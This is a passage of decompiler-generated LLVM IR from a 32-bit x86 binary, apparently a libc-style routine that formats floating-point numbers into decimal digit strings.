  %v0_80558f366 = phi i32 [ 13, %dec_label_pc_8055886 ], [ %v1_80558a8, %dec_label_pc_80558f7 ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_8055886 ], [ %stack_var_-220.1, %dec_label_pc_80558f7 ]
  %v1_80558a8 = add i32 %v0_80558f366, -1
  %v4_80558a9 = fcmp ule x86_fp80 %v1_80558e1, %v2_80558a9
  br i1 %v4_80558a9, label %dec_label_pc_80558d0, label %dec_label_pc_80558ad

dec_label_pc_80558ad:                             ; preds = %dec_label_pc_80558a6
  store x86_fp80 %v1_80558e1, x86_fp80* %st0.global-to-local, align 4
  %v3_80558af = mul i32 %v1_80558a8, 12
  store i32 %v3_80558af, i32* %eax.global-to-local, align 4
  %v1_80558b2 = add i32 %v3_80558af, ptrtoint (x86_fp80** @global_var_805aec0.546 to i32)
  %v2_80558b2 = inttoptr i32 %v1_80558b2 to x86_fp80*
  %v3_80558b2 = load x86_fp80, x86_fp80* %v2_80558b2, align 4
  %v4_80558b8 = fmul x86_fp80 %v1_80558e1, %v3_80558b2
  store x86_fp80 %v4_80558b8, x86_fp80* %st1.global-to-local, align 4
  %v4_80558bc = fcmp ule x86_fp80 %v4_80558b8, %v3_80558b2
  br i1 %v4_80558bc, label %dec_label_pc_80558f1, label %dec_label_pc_80558c0

dec_label_pc_80558c0:                             ; preds = %dec_label_pc_80558ad
  store x86_fp80 %v4_80558b8, x86_fp80* %st1.global-to-local, align 4
  %v5_80558ca = sub i32 %stack_var_-220.0, %v0_80558f7
  br label %dec_label_pc_80558f3

dec_label_pc_80558d0:                             ; preds = %dec_label_pc_80558a6
  %v3_80558d0 = mul i32 %v1_80558a8, 12
  store i32 %v3_80558d0, i32* %eax.global-to-local, align 4
  %v1_80558d3 = add i32 %v3_80558d0, ptrtoint (x86_fp80** @global_var_805aec0.546 to i32)
  %v2_80558d3 = inttoptr i32 %v1_80558d3 to x86_fp80*
  %v3_80558d3 = load x86_fp80, x86_fp80* %v2_80558d3, align 4
  %v4_80558d9 = fdiv x86_fp80 %v3_80558d3, %v1_80558e1
  store x86_fp80 %v4_80558d9, x86_fp80* %st1.global-to-local, align 4
  %v4_80558db = fcmp ogt x86_fp80 %v3_80558d3, %v1_80558e1
  br i1 %v4_80558db, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_80558d0
  store x86_fp80 %v3_80558d3, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_80558e1

bb183:                                            ; preds = %dec_label_pc_80558d0
  %v5_80558db = fcmp olt x86_fp80 %v3_80558d3, %v1_80558e1
  br i1 %v5_80558db, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_80558d3, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_80558f1

bb184:                                            ; preds = %bb183
  %not.v6_80558db = fcmp une x86_fp80 %v3_80558d3, %v1_80558e1
  store x86_fp80 %v3_80558d3, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_80558db, label %dec_label_pc_80558f1, label %dec_label_pc_80558e1

dec_label_pc_80558e1:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_80558d3, x86_fp80* %st1.global-to-local, align 4
  %v5_80558eb = add i32 %stack_var_-220.0, %v0_80558f7
  br label %dec_label_pc_80558f3

dec_label_pc_80558f1:                             ; preds = %dec_label_pc_80558ad, %.thread51, %bb184
  %v1_80558f1 = phi x86_fp80 [ %v1_80558e1, %.thread51 ], [ %v1_80558e1, %bb184 ], [ %v3_80558b2, %dec_label_pc_80558ad ]
  %v0_80558a680 = phi x86_fp80 [ %v3_80558d3, %.thread51 ], [ %v3_80558d3, %bb184 ], [ %v4_80558b8, %dec_label_pc_80558ad ]
  store x86_fp80 %v1_80558f1, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80558f3

dec_label_pc_80558f3:                             ; preds = %dec_label_pc_80558e1, %dec_label_pc_80558c0, %dec_label_pc_80558f1
  %v2_80558a981 = phi x86_fp80 [ %v1_80558f1, %dec_label_pc_80558f1 ], [ %v2_80558a9, %dec_label_pc_80558e1 ], [ %v1_80558e1, %dec_label_pc_80558c0 ]
  %v0_80558a679 = phi x86_fp80 [ %v0_80558a680, %dec_label_pc_80558f1 ], [ %v3_80558d3, %dec_label_pc_80558e1 ], [ %v4_80558b8, %dec_label_pc_80558c0 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_80558f1 ], [ %v5_80558eb, %dec_label_pc_80558e1 ], [ %v5_80558ca, %dec_label_pc_80558c0 ]
  %v1_80558f3 = icmp eq i32 %v1_80558a8, 0
  br i1 %v1_80558f3, label %.thread60, label %dec_label_pc_80558f7

dec_label_pc_80558f7:                             ; preds = %dec_label_pc_80558f3
  %v2_80558f7 = sdiv i32 %v0_80558f7, 2
  store i32 %v2_80558f7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80558a6

.thread60:                                        ; preds = %dec_label_pc_80558f3
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_805591b

dec_label_pc_805591b:                             ; preds = %dec_label_pc_80557fe, %.thread60
  %v0_80559d5 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_80557fe ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_80557fe ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_805591f = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_80557f6, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8055932 = and i32 %v2_805591f, -65536
  %v1_8055937 = udiv i16 %tmp146, 256
  %v2_8055937 = zext i16 %v1_8055937 to i32
  %v3_8055937 = or i32 %v2_8055937, 12
  %v10_8055937 = mul nuw nsw i32 %v3_8055937, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_8055932.masked = zext i16 %tmp194 to i32
  %v11_8055937 = or i32 %v10_8055937, %v4_8055932.masked
  %v12_8055937 = or i32 %v11_8055937, %v6_8055932
  store i32 %v12_8055937, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805593f

dec_label_pc_805593f:                             ; preds = %dec_label_pc_8055991.dec_label_pc_805593f_crit_edge, %dec_label_pc_805591b
  %v2_8055964 = phi x86_fp80 [ %storemerge, %dec_label_pc_805591b ], [ %v2_8055964.pre, %dec_label_pc_8055991.dec_label_pc_805593f_crit_edge ]
  %v1_805593f = phi i3 [ %v1_80557f6, %dec_label_pc_805591b ], [ %v1_805593f.pre, %dec_label_pc_8055991.dec_label_pc_805593f_crit_edge ]
  %v3_8055966 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_805591b ], [ %v0_805593f.pre, %dec_label_pc_8055991.dec_label_pc_805593f_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805591f, %dec_label_pc_805591b ], [ %v4_805595f, %dec_label_pc_8055991.dec_label_pc_805593f_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_8055966 to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_8055959 = sitofp i32 %tmp195 to x86_fp80
  %v4_805595f = add i32 %stack_var_-212.0, 9
  %v4_8055964 = fsub x86_fp80 %v2_8055964, %v5_8055959
  store i3 %v1_805593f, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8055966 = fmul x86_fp80 %v3_8055966, %v4_8055964
  store x86_fp80 %v4_8055966, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8055968

dec_label_pc_8055968:                             ; preds = %dec_label_pc_8055968.dec_label_pc_8055968_crit_edge, %dec_label_pc_805593f
  %v0_805597c = phi i32 [ %v0_805597c.pre, %dec_label_pc_8055968.dec_label_pc_8055968_crit_edge ], [ %tmp195, %dec_label_pc_805593f ]
  %v0_805596c = phi i32 [ %v0_805596c.pre, %dec_label_pc_8055968.dec_label_pc_8055968_crit_edge ], [ 0, %dec_label_pc_805593f ]
  %v1_805596c = add i32 %v0_805596c, 1
  store i32 %v1_805596c, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8055976 = sub i32 %v4_805595f, %v1_805596c
  %div = udiv i32 %v0_805597c, 10
  %tmp185 = urem i32 %v0_805597c, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8055982 = and i32 %div, 536870656
  store i32 %v2_8055976, i32* %edx.global-to-local, align 4
  %v1_8055988 = trunc i32 %tmp185 to i8
  %v2_8055988 = or i8 %v1_8055988, 48
  %v12_8055988 = zext i8 %v2_8055988 to i32
  %v15_8055988 = or i32 %v12_8055988, %v3_8055982
  store i32 %v15_8055988, i32* %eax.global-to-local, align 4
  %v3_805598d = inttoptr i32 %v2_8055976 to i8*
  store i8 %v2_8055988, i8* %v3_805598d, align 1
  %v7_805598f = icmp sgt i32 %v1_805596c, 8
  br i1 %v7_805598f, label %dec_label_pc_8055991, label %dec_label_pc_8055968.dec_label_pc_8055968_crit_edge

dec_label_pc_8055968.dec_label_pc_8055968_crit_edge: ; preds = %dec_label_pc_8055968
  %v0_805596c.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_805597c.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055968

dec_label_pc_8055991:                             ; preds = %dec_label_pc_8055968
  %v0_8055991 = load i32, i32* @edi, align 4
  %v1_8055991 = add i32 %v0_8055991, 1
  store i32 %v1_8055991, i32* @edi, align 4
  %v7_8055995 = icmp sgt i32 %v1_8055991, 2
  br i1 %v7_8055995, label %dec_label_pc_8055997, label %dec_label_pc_8055991.dec_label_pc_805593f_crit_edge

dec_label_pc_8055991.dec_label_pc_805593f_crit_edge: ; preds = %dec_label_pc_8055991
  %v0_805593f.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805593f.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8055964.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805593f

dec_label_pc_8055997:                             ; preds = %dec_label_pc_8055991
  %v0_8055997 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8055997 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8055997, x86_fp80* %st0.global-to-local, align 4
  %v2_8055999 = add i3 %v0_8055997, 2
  store i3 %v2_8055999, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_805599b = add i8 %stack_var_-207.0, -96
  %v6_805599b = sub i8 95, %stack_var_-207.0
  %v7_805599b = and i8 %v6_805599b, %stack_var_-207.0
  %v8_805599b = icmp slt i8 %v7_805599b, 0
  %v9_805599b = icmp eq i8 %v4_805599b, 0
  %v10_805599b = icmp slt i8 %v4_805599b, 0
  %v3_80559a0 = icmp eq i1 %v10_805599b, %v8_805599b
  %v4_80559a0 = icmp eq i1 %v9_805599b, false
  %v5_80559a0 = and i1 %v4_80559a0, %v3_80559a0
  br i1 %v5_80559a0, label %dec_label_pc_80559af, label %dec_label_pc_80559a2

dec_label_pc_80559a2:                             ; preds = %dec_label_pc_8055997
  %v4_80559a2 = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_80559af

dec_label_pc_80559af:                             ; preds = %dec_label_pc_8055997, %dec_label_pc_80559a2
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_8055997 ], [ %v4_80559a2, %dec_label_pc_80559a2 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8055997 ], [ 69, %dec_label_pc_80559a2 ]
  %v12_80559af = icmp eq i8 %stack_var_-207.1, 103
  %v1_80559b4 = icmp eq i1 %v12_80559af, false
  br i1 %v1_80559b4, label %dec_label_pc_80559bd, label %dec_label_pc_80559b6

dec_label_pc_80559b6:                             ; preds = %dec_label_pc_80559af
  %v0_80559b6 = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_80559b6, 1
  br i1 %tmp186, label %dec_label_pc_80559c4, label %dec_label_pc_80559ba

dec_label_pc_80559ba:                             ; preds = %dec_label_pc_80559b6
  %v1_80559ba = add i32 %v0_80559b6, -1
  store i32 %v1_80559ba, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80559c4

dec_label_pc_80559bd:                             ; preds = %dec_label_pc_80559af
  %v12_80559bd = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_80559bd, label %dec_label_pc_80559c8, label %dec_label_pc_80559bd.dec_label_pc_80559c4_crit_edge

dec_label_pc_80559bd.dec_label_pc_80559c4_crit_edge: ; preds = %dec_label_pc_80559bd
  %v0_80559c4.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80559c4

dec_label_pc_80559c4:                             ; preds = %dec_label_pc_80559bd.dec_label_pc_80559c4_crit_edge, %dec_label_pc_80559b6, %dec_label_pc_80559ba
  %v0_80559c4 = phi i32 [ %v0_80559c4.pre, %dec_label_pc_80559bd.dec_label_pc_80559c4_crit_edge ], [ %v0_80559b6, %dec_label_pc_80559b6 ], [ %v1_80559ba, %dec_label_pc_80559ba ]
  store i32 %v0_80559c4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80559f5

dec_label_pc_80559c8:                             ; preds = %dec_label_pc_80559bd
  store i32 %v0_80559d5, i32* %eax.global-to-local, align 4
  %v0_80559cc = load i32, i32* %ebp.global-to-local, align 4
  %v2_80559cc = add i32 %v0_80559cc, %v0_80559d5
  store i32 %v2_80559cc, i32* %ebx.global-to-local, align 4
  %v5_80559d3 = icmp slt i32 %v2_80559cc, -1
  br i1 %v5_80559d3, label %dec_label_pc_80559d5, label %dec_label_pc_80559f5

dec_label_pc_80559d5:                             ; preds = %dec_label_pc_80559c8
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80559dd = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80559dd, i32* %eax.global-to-local, align 4
  %v4_80559e5 = bitcast i32* %stack_var_-72 to i8*
  %v5_80559e5 = call i32 @__GI_memset(i8* %v4_80559e5, i32 48, i32 21)
  store i32 %v5_80559e5, i32* %eax.global-to-local, align 4
  %v0_80559f5.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80559f5

dec_label_pc_80559f5:                             ; preds = %dec_label_pc_80559c8, %dec_label_pc_80559d5, %dec_label_pc_80559c4
  %v1_8055a15 = phi i32 [ %v0_80559c4, %dec_label_pc_80559c4 ], [ %v2_80559cc, %dec_label_pc_80559c8 ], [ %v0_80559f5.pr.pre, %dec_label_pc_80559d5 ]
  %stack_var_-220.3 = phi i32 [ %v0_80559d5, %dec_label_pc_80559c4 ], [ %v0_80559d5, %dec_label_pc_80559c8 ], [ -1, %dec_label_pc_80559d5 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8055a08 = icmp sgt i32 %v1_8055a15, 20
  br i1 %v7_8055a08, label %dec_label_pc_8055a0a, label %dec_label_pc_8055a15

dec_label_pc_8055a0a:                             ; preds = %dec_label_pc_80559f5
  %v2_8055a0a = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8055a0a, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055a29.preheader

dec_label_pc_8055a15:                             ; preds = %dec_label_pc_80559f5
  %v0_8055a15 = load i32, i32* @esp, align 4
  %v2_8055a15 = add i32 %v1_8055a15, 165
  %v3_8055a15 = add i32 %v2_8055a15, %v0_8055a15
  store i32 %v3_8055a15, i32* %eax.global-to-local, align 4
  %v1_8055a1c = add i32 %v3_8055a15, 2
  %v2_8055a1c = inttoptr i32 %v1_8055a1c to i8*
  %v3_8055a1c = load i8, i8* %v2_8055a1c, align 1
  %v4_8055a1c = add i8 %v3_8055a1c, -53
  %v9_8055a1c = sub i8 52, %v3_8055a1c
  %v10_8055a1c = and i8 %v9_8055a1c, %v3_8055a1c
  %v11_8055a1c = icmp slt i8 %v10_8055a1c, 0
  %v13_8055a1c = icmp slt i8 %v4_8055a1c, 0
  store i32 %v1_8055a1c, i32* %ecx.global-to-local, align 4
  %v2_8055a23 = icmp eq i1 %v13_8055a1c, %v11_8055a1c
  %v3_8055a23 = zext i1 %v2_8055a23 to i32
  br label %dec_label_pc_8055a29.preheader

dec_label_pc_8055a29.preheader:                   ; preds = %dec_label_pc_8055a15, %dec_label_pc_8055a0a
  %v0_8055a29102 = phi i32 [ %v1_8055a1c, %dec_label_pc_8055a15 ], [ %v2_8055a0a, %dec_label_pc_8055a0a ]
  %storemerge71 = phi i32 [ %v3_8055a23, %dec_label_pc_8055a15 ], [ 0, %dec_label_pc_8055a0a ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055a29

dec_label_pc_8055a29:                             ; preds = %dec_label_pc_8055a29.backedge, %dec_label_pc_8055a29.preheader
  %v3_8055a2a = phi i32 [ %v3_8055a2a.pre, %dec_label_pc_8055a29.backedge ], [ %storemerge71, %dec_label_pc_8055a29.preheader ]
  %v0_8055a29 = phi i32 [ %v0_8055a2c, %dec_label_pc_8055a29.backedge ], [ %v0_8055a29102, %dec_label_pc_8055a29.preheader ]
  %v1_8055a29 = add i32 %v0_8055a29, -1
  store i32 %v1_8055a29, i32* %ecx.global-to-local, align 4
  %v1_8055a2a = inttoptr i32 %v1_8055a29 to i8*
  %v2_8055a2a = load i8, i8* %v1_8055a2a, align 1
  %v4_8055a2a = trunc i32 %v3_8055a2a to i8
  %v5_8055a2a = add i8 %v2_8055a2a, %v4_8055a2a
  store i8 %v5_8055a2a, i8* %v1_8055a2a, align 1
  %v0_8055a2c = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055a2c = inttoptr i32 %v0_8055a2c to i8*
  %v2_8055a2c = load i8, i8* %v1_8055a2c, align 1
  %v3_8055a2c = zext i8 %v2_8055a2c to i32
  %v4_8055a2c = load i32, i32* %edx.global-to-local, align 4
  %v5_8055a2c = and i32 %v4_8055a2c, -256
  %v6_8055a2c = or i32 %v5_8055a2c, %v3_8055a2c
  store i32 %v6_8055a2c, i32* %edx.global-to-local, align 4
  %v7_8055a2e = icmp eq i8 %v2_8055a2c, 48
  br i1 %v7_8055a2e, label %dec_label_pc_8055a29.backedge, label %dec_label_pc_8055a33

dec_label_pc_8055a29.backedge:                    ; preds = %dec_label_pc_8055a29, %dec_label_pc_8055a33
  %v3_8055a2a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055a29

dec_label_pc_8055a33:                             ; preds = %dec_label_pc_8055a29
  %v2_8055a33 = add i8 %v2_8055a2c, -57
  %v7_8055a33 = sub i8 56, %v2_8055a2c
  %v8_8055a33 = and i8 %v7_8055a33, %v2_8055a2c
  %v9_8055a33 = icmp slt i8 %v8_8055a33, 0
  %v10_8055a33 = icmp eq i8 %v2_8055a33, 0
  %v11_8055a33 = icmp slt i8 %v2_8055a33, 0
  %v3_8055a36 = icmp eq i1 %v11_8055a33, %v9_8055a33
  %v4_8055a36 = icmp eq i1 %v10_8055a33, false
  %v5_8055a36 = and i1 %v4_8055a36, %v3_8055a36
  br i1 %v5_8055a36, label %dec_label_pc_8055a29.backedge, label %dec_label_pc_8055a38

dec_label_pc_8055a38:                             ; preds = %dec_label_pc_8055a33
  %v2_8055a38 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8055a38, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8055a2c, %v2_8055a38
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_8055a43, label %dec_label_pc_8055a50

dec_label_pc_8055a43:                             ; preds = %dec_label_pc_8055a38
  store i32 %v2_805591f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055a59

dec_label_pc_8055a50:                             ; preds = %dec_label_pc_8055a38
  store i32 %v2_8055a38, i32* %edx.global-to-local, align 4
  store i32 %v2_8055a38, i32* %ecx.global-to-local, align 4
  %v1_8055a58 = add i32 %stack_var_-220.3, 1
  store i32 %v1_8055a58, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055a59

dec_label_pc_8055a59:                             ; preds = %dec_label_pc_8055a43, %dec_label_pc_8055a50
  %v0_8055a59 = phi i32 [ %v0_8055a2c, %dec_label_pc_8055a43 ], [ %v2_8055a38, %dec_label_pc_8055a50 ]
  %v1_8055a59 = add i32 %v0_8055a59, 1
  store i32 %v1_8055a59, i32* %eax.global-to-local, align 4
  %v2_8055a60 = inttoptr i32 %v1_8055a59 to i8*
  store i8 0, i8* %v2_8055a60, align 1
  br i1 %v1_80559b4, label %dec_label_pc_8055a86, label %dec_label_pc_8055a6b

dec_label_pc_8055a6b:                             ; preds = %dec_label_pc_8055a59
  %v0_8055a6b = load i32, i32* %esi.global-to-local, align 4
  %v5_8055a6e = icmp slt i32 %v0_8055a6b, -4
  br i1 %v5_8055a6e, label %dec_label_pc_8055a93, label %dec_label_pc_8055a70

dec_label_pc_8055a70:                             ; preds = %dec_label_pc_8055a6b
  %v1_8055a70 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8055a72 = icmp slt i32 %v1_8055a70, %v0_8055a6b
  br i1 %v7_8055a72, label %dec_label_pc_8055a93, label %dec_label_pc_8055a7b

dec_label_pc_8055a7b:                             ; preds = %dec_label_pc_8055a70
  %v2_8055a7d = sub i32 %v1_8055a70, %v0_8055a6b
  store i32 %v2_8055a7d, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055a97

dec_label_pc_8055a86:                             ; preds = %dec_label_pc_8055a59
  %v4_8055a86 = zext i8 %stack_var_-207.1 to i32
  %v5_8055a86 = load i32, i32* %ebx.global-to-local, align 4
  %v6_8055a86 = and i32 %v5_8055a86, -256
  %v7_8055a86 = or i32 %v6_8055a86, %v4_8055a86
  store i32 %v7_8055a86, i32* %ebx.global-to-local, align 4
  %v10_8055a8a = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8055a8a, label %dec_label_pc_8055a86.dec_label_pc_8055a97_crit_edge, label %dec_label_pc_8055a93

dec_label_pc_8055a86.dec_label_pc_8055a97_crit_edge: ; preds = %dec_label_pc_8055a86
  %v0_8055a97.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055a97

dec_label_pc_8055a93:                             ; preds = %dec_label_pc_8055a6b, %dec_label_pc_8055a70, %dec_label_pc_8055a86
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8055a86 ], [ 103, %dec_label_pc_8055a70 ], [ 103, %dec_label_pc_8055a6b ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055aa1

dec_label_pc_8055a97:                             ; preds = %dec_label_pc_8055a86.dec_label_pc_8055a97_crit_edge, %dec_label_pc_8055a7b
  %v0_8055a99 = phi i32 [ %v0_8055a97.pre, %dec_label_pc_8055a86.dec_label_pc_8055a97_crit_edge ], [ %v0_8055a6b, %dec_label_pc_8055a7b ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8055a86.dec_label_pc_8055a97_crit_edge ], [ 102, %dec_label_pc_8055a7b ]
  %v2_8055a97 = icmp slt i32 %v0_8055a99, 0
  store i32 %v0_8055a99, i32* %ebx.global-to-local, align 4
  %v1_8055a9b = icmp eq i1 %v2_8055a97, false
  br i1 %v1_8055a9b, label %dec_label_pc_8055aa1, label %dec_label_pc_8055a9d

dec_label_pc_8055a9d:                             ; preds = %dec_label_pc_8055a97
  %v0_8055a9d = load i32, i32* %edx.global-to-local, align 4
  %v1_8055a9d = add i32 %v0_8055a9d, -1
  store i32 %v1_8055a9d, i32* %edx.global-to-local, align 4
  %v1_8055a9e = inttoptr i32 %v1_8055a9d to i8*
  store i8 48, i8* %v1_8055a9e, align 1
  %v0_8055ad6.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055aa1

dec_label_pc_8055aa1:                             ; preds = %dec_label_pc_8055a97, %dec_label_pc_8055a93, %dec_label_pc_8055a9d
  %v1_8055b31 = phi i32 [ %v0_8055a99, %dec_label_pc_8055a97 ], [ %v0_8055ad6.pre, %dec_label_pc_8055a9d ], [ 0, %dec_label_pc_8055a93 ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_8055a97 ], [ %stack_var_-197.1, %dec_label_pc_8055a9d ], [ %stack_var_-197.0, %dec_label_pc_8055a93 ]
  %v2_8055aa1 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8055aa1, i32* %eax.global-to-local, align 4
  %v0_8055ab0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055ab0 = add i32 %v0_8055ab0, 1
  store i32 %v1_8055ab0, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_8055abf = inttoptr i32 %v0_8055ab0 to i8*
  %v2_8055abf = load i8, i8* %v1_8055abf, align 1
  %v3_8055abf = zext i8 %v2_8055abf to i32
  %v5_8055abf = and i32 %v2_8055aa1, -256
  %v6_8055abf = or i32 %v3_8055abf, %v5_8055abf
  store i32 %v6_8055abf, i32* %eax.global-to-local, align 4
  store i32 %v6_8055abf, i32* %stack_var_-22, align 4
  %v2_8055ad4 = sub i32 %v1_8055a59, %v1_8055ab0
  store i32 %v2_8055ad4, i32* %edx.global-to-local, align 4
  %v1_8055ad6 = icmp eq i32 %v1_8055b31, 0
  %v2_8055ad6 = icmp slt i32 %v1_8055b31, 0
  br i1 %v2_8055ad6, label %dec_label_pc_8055b25, label %dec_label_pc_8055ada

dec_label_pc_8055ada:                             ; preds = %dec_label_pc_8055aa1
  %v2_8055ada = sub i32 %v1_8055b31, %v2_8055ad4
  %v8_8055ada = xor i32 %v2_8055ad4, %v1_8055b31
  %v9_8055ada = xor i32 %v2_8055ada, %v1_8055b31
  %v10_8055ada = and i32 %v9_8055ada, %v8_8055ada
  %v11_8055ada = icmp slt i32 %v10_8055ada, 0
  %v13_8055ada = icmp slt i32 %v2_8055ada, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8055ae8 = icmp eq i1 %v13_8055ada, %v11_8055ada
  br i1 %v2_8055ae8, label %dec_label_pc_8055aea, label %dec_label_pc_8055b1e

dec_label_pc_8055aea:                             ; preds = %dec_label_pc_8055ada
  store i32 %v2_8055ada, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_8055ada, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_8055aff, label %dec_label_pc_8055b1a

dec_label_pc_8055aff:                             ; preds = %dec_label_pc_8055aea
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8055b1a

dec_label_pc_8055b1a:                             ; preds = %dec_label_pc_8055aea, %dec_label_pc_8055aff
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_8055aff ], [ %stack_var_-132, %dec_label_pc_8055aea ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055b3a

dec_label_pc_8055b1e:                             ; preds = %dec_label_pc_8055ada
  %v4_8055b20 = icmp eq i1 %v1_8055ad6, false
  br i1 %v4_8055b20, label %dec_label_pc_8055b2b, label %dec_label_pc_8055b22

dec_label_pc_8055b22:                             ; preds = %dec_label_pc_8055b1e
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055b25

dec_label_pc_8055b25:                             ; preds = %dec_label_pc_8055aa1, %dec_label_pc_8055b22
  %v0_8055b6d112 = phi i32 [ %v1_8055b31, %dec_label_pc_8055aa1 ], [ -1, %dec_label_pc_8055b22 ]
  %v2_8055b25 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8055b25, i32* @ecx, align 4
  br label %dec_label_pc_8055b3a

dec_label_pc_8055b2b:                             ; preds = %dec_label_pc_8055b1e
  %v2_8055b2f = add i32 %v1_8055ab0, %v1_8055b31
  store i32 %v2_8055b2f, i32* %edi.global-to-local, align 4
  %v2_8055b31 = sub i32 %v2_8055ad4, %v1_8055b31
  store i32 %v2_8055b31, i32* %edx.global-to-local, align 4
  %v2_8055b33 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8055b33, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055b3a

dec_label_pc_8055b3a:                             ; preds = %dec_label_pc_8055b25, %dec_label_pc_8055b1a, %dec_label_pc_8055b2b
  %v0_8055b6d111 = phi i32 [ %v0_8055b6d112, %dec_label_pc_8055b25 ], [ -1, %dec_label_pc_8055b1a ], [ -1, %dec_label_pc_8055b2b ]
  %v0_8055b56 = phi i32 [ %v2_8055b25, %dec_label_pc_8055b25 ], [ %storemerge28, %dec_label_pc_8055b1a ], [ %v2_8055b33, %dec_label_pc_8055b2b ]
  %v0_8055b47 = phi i32 [ %v2_8055ad4, %dec_label_pc_8055b25 ], [ 0, %dec_label_pc_8055b1a ], [ %v2_8055b31, %dec_label_pc_8055b2b ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_8055b41 = inttoptr i32 %v1_80557b7 to i8*
  %v3_8055b41 = load i8, i8* %v2_8055b41, align 1
